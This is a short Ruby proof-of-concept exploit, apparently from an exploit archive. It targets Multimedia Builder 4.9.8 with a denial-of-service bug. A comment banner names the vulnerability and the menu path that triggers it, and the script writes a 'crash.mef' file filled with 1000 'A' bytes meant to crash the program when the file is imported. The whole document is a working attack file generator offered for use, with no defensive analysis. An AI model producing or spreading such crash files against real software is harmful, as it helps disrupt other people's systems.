########################################DESC####################################################
#Multimedia Builder 4.9.8 Malicious mef File Denial of service vulnerability ,when opening a   #
#malicious .mef file.                                                                          #
#To trigger the exploit , go to file->MEF Import ->load MEF                                    #                                                               #
################################################################################################
  
#!/usr/bin/ruby
 
File.open "crash.mef" , "w" do |file|
 
crash = "\x41" * 1000
file.write crash
end
